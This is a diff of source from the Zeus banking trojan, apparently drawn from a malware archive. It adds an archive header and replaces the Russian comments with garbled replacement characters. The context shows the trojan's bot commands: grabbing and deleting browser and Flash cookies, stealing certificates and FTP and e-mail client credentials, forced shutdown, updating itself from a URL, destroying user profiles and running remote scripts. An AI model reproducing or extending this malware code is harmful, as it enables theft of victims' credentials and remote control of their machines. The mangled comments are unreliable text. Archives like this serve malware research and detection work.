@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shellapi.h>
 #include <wincrypt.h>
@@ -35,16 +46,16 @@
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  Операции со списками HttpGrabber'а.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpGrabber'пїЅ.
 
   IN listId         - LocalConfig::ITEM_URLLIST_*.
-  IN add            - true - добавление элементов в список,
-                      false - удаление элементов из списка.
-  IN arguments      - аргументы.
-  IN argumentsCount - кол. аргументов.
+  IN add            - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN arguments      - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN argumentsCount - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return            - true - в случаи успеха,
-                      false - в случаи ошибки.
+  Return            - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -99,7 +110,7 @@ enum
 static DWORD pendingFlags;
 
 /*
-  Выключение компьютера, пользователь должен обладать правами для этой операции.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -108,7 +119,7 @@ static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Перезагрузка компьютера, пользователь должен обладать правами для этой операции.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -117,7 +128,7 @@ static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление бота с текущего пользователя.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -126,8 +137,8 @@ static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Немедленное обновление файла конфигурации. Если казана URL, то обновление произойдет с указаной
-  URL, и такжебудеит принудительно запушен бот-файл обнволения указаный в загружаемой конфигурации.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+  URL, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool botUpdate(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -207,7 +218,7 @@ static bool fsSearchRemove(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Уничтожение текущего пользователя.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -216,7 +227,7 @@ static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Завершение текущей сессии пользователя.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userLogoff(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -302,7 +313,7 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  Получение куков известных браузеров.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -316,7 +327,7 @@ static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление куков известных браузеров.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -331,7 +342,7 @@ static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
 #endif
 
 /*
-  Сохранение серитифатов из MY.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ MY.
 */
 static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -339,7 +350,7 @@ static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление серитифкатов из MY.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ MY.
 */
 static bool userCertsRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -360,7 +371,7 @@ static bool userUrlUnblock(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  Установка домашних страницы для всех поддерживаемых браузеров.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -374,7 +385,7 @@ static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_SOFTWARE_FTP > 0)
 /*
-  Получение данных FTP-клиентов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ FTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -391,7 +402,7 @@ static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_SOFTWARE_EMAIL > 0)
 /*
-  Получение данных E-mail-клиентов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ E-mail-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -407,7 +418,7 @@ static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 #endif
 
 /*
-  Получение куков флеш-плеера.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -416,7 +427,7 @@ static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление куков флеш-плеера.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -425,7 +436,7 @@ static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Исполнение команд, которые должны исполниться после отправки ответа серверу.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void executePendingCommands(void)
 {
@@ -571,12 +582,12 @@ static int resultProc(DWORD loop, Report::SERVERSESSION *session)
 }
 
 /*
-  Проверка статус скрипта.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN hash - MD5 хэш скрипта.
+  IN hash - MD5 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return  - 0 - в случаи успеха,
-            CryptedStrings::id_* - в случаи провала.
+  Return  - 0 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+            CryptedStrings::id_* - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static WORD getScriptStatusByHash(LPBYTE hash)
 {
@@ -642,11 +653,11 @@ static WORD getScriptStatusByHash(LPBYTE hash)
 /*
   Execution of the script.
 
-  IN scriptText - текст скрипта.
-  OUT errorLine - строка на котроый произошла ошибка, или (DWORD)-1 если ошиюка произошла не на
-                  строке.
-  Return        - 0 - в случаи успеха,
-                  CryptedStrings::id_* - случаи провала.
+  IN scriptText - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT errorLine - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ
+                  пїЅпїЅпїЅпїЅпїЅпїЅ.
+  Return        - 0 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                  CryptedStrings::id_* - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
 {
